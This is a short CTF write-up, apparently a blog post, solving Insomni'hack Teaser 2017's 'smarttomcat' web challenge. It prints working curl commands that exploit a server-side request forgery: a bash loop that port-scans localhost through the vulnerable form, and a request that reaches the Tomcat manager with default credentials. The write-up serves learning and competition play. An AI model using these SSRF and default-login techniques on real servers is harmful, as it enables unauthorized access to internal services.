---
layout: post
title: "CTF: Solving smarttomcat challenge from Insomnihack Teaser 2017"
author: capitol
category: ctf
---
![channel](/images/SleepyTomcat.jpg)

##### category:
web

##### points:
50

#### Writeup
The Insomni'hack teaser 2017 was a fun CTF with a good spread between easy and hard challenges.

The smarttomcat challenge was an easy web challenge that was about attacking a badly secured tomcat server, as a user you where presented with a webpage that had an backend written in php, that backend called a tomcat server on localhost.

When looking at the form post data from the browser it became apparant that the url that the backend called was submitted by the form.

This enabled us to write a port scan as a simple bash loop:

```bash
for x in $(seq 1 65535); do echo $x >> /tmp/log && curl 'http://smarttomcat.teaser.insomnihack.ch/index.php' --data "u=http%3A%2F%2Flocalhost%3A$x%2F" >> /tmp/log;done
```

This didn't really help us. And we realized that we could access the tomcat management url on the same port as the rest of the application. A simple google gave us the default username and password.

#### Solution
```bash
curl 'http://smarttomcat.teaser.insomnihack.ch/index.php' --data 'u=http://tomcat:tomcat@127.0.0.1:8080/manager/html'
```
